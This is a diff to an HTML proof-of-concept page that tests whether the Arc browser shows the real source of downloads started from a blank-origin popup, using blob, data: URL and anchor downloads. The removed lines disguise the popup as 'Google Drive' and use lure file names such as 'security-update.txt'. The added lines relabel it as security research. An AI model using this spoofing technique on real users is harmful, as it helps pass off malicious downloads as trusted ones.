@@ -15,16 +15,16 @@ button:active{opacity:.7}
 </head>
 <body>
 <h2>Download Source Confusion</h2>
-<p>Tests whether Arc shows the correct origin for downloads initiated from the empty-origin popup. Does the download prompt show a source, or is it blank?</p>
+<p>Tests whether Arc shows the correct origin for downloads initiated from the no-origin popup. Does the download prompt show a source, or is it blank?</p>
 
-<button onclick="blobDownload()">Click me — Blob download from empty popup</button>
+<button onclick="blobDownload()">Click me &mdash; Blob download from popup</button>
 <div class="info">Triggers a file download from inside the no-origin popup. Check what source Arc shows in the download prompt.</div>
 
-<button onclick="dataDownload()">Click me — data: URL download</button>
-<div class="info">Download via data: URL from empty popup.</div>
+<button onclick="dataDownload()">Click me &mdash; data: URL download</button>
+<div class="info">Download via data: URL from the popup.</div>
 
-<button onclick="anchorDownload()">Click me — anchor download attribute</button>
-<div class="info">Download via &lt;a download&gt; from empty popup.</div>
+<button onclick="anchorDownload()">Click me &mdash; anchor download attribute</button>
+<div class="info">Download via &lt;a download&gt; from the popup.</div>
 
 <script>
 function openEmpty(cb){
@@ -39,7 +39,7 @@ function openEmpty(cb){
     var w=window.open('',a.target);
     if(!w)return;
     w.document.open();
-    w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Google Drive</title></head><body style="font-family:-apple-system,sans-serif;background:#fff;text-align:center;padding:40px 24px"><p style="color:#5f6368">Preparing download...</p></body></html>');
+    w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Download test (research)</title></head><body style="font-family:-apple-system,sans-serif;background:#fff;text-align:center;padding:40px 24px"><div style="display:inline-block;background:#fff3cd;border:1px solid #ffe08a;border-radius:6px;padding:6px 10px;font-size:12px;color:#7a5c00;margin-bottom:16px">Security research PoC</div><p style="color:#5f6368">Preparing download&hellip;</p></body></html>');
     w.document.close();
     w.stop();
     setTimeout(function(){cb(w)},200);
@@ -49,11 +49,11 @@ function openEmpty(cb){
 function blobDownload(){
   openEmpty(function(w){
     try{
-      var content='This file was downloaded from an empty-origin popup.\nIf you see this, the download succeeded without a visible source origin.\n\nPoC: arc-ios-download-spoof';
+      var content='This file was downloaded from a no-origin popup.\nIf you see this, the download succeeded without a visible source origin.\n\nPoC: arc-ios-download-spoof';
       var blob=new w.Blob([content],{type:'text/plain'});
       var url=w.URL.createObjectURL(blob);
       var a=w.document.createElement('a');
-      a.href=url;a.download='important-document.txt';
+      a.href=url;a.download='research-note.txt';
       w.document.body.appendChild(a);a.click();
       w.document.body.querySelector('p').textContent='Download triggered — check source origin in prompt';
     }catch(e){w.document.body.querySelector('p').textContent='Error: '+e.message}
@@ -64,8 +64,8 @@ function dataDownload(){
   openEmpty(function(w){
     try{
       var a=w.document.createElement('a');
-      a.href='data:text/plain;base64,VGhpcyBmaWxlIHdhcyBkb3dubG9hZGVkIHZpYSBkYXRhOiBVUkwgZnJvbSBhbiBlbXB0eS1vcmlnaW4gcG9wdXAu';
-      a.download='security-update.txt';
+      a.href='data:text/plain;base64,VGhpcyBmaWxlIHdhcyBkb3dubG9hZGVkIHZpYSBkYXRhOiBVUkwgZnJvbSBhIG5vLW9yaWdpbiBwb3B1cC4=';
+      a.download='research-note-2.txt';
       w.document.body.appendChild(a);a.click();
       w.document.body.querySelector('p').textContent='data: download triggered';
     }catch(e){w.document.body.querySelector('p').textContent='Error: '+e.message}
@@ -75,7 +75,7 @@ function dataDownload(){
 function anchorDownload(){
   openEmpty(function(w){
     try{
-      w.document.body.innerHTML='<a href="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" download="google-logo.png" style="font-size:18px;color:#1a73e8;display:block;padding:40px;text-align:center">Tap here to download</a><p style="color:#999;font-size:12px;text-align:center">Check what origin Arc shows for this download</p>';
+      w.document.body.innerHTML='<a href="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" download="sample-image.png" style="font-size:18px;color:#1a73e8;display:block;padding:40px;text-align:center">Tap here to download</a><p style="color:#999;font-size:12px;text-align:center">Check what origin Arc shows for this download</p>';
     }catch(e){w.document.body.textContent='Error: '+e.message}
   });
 }
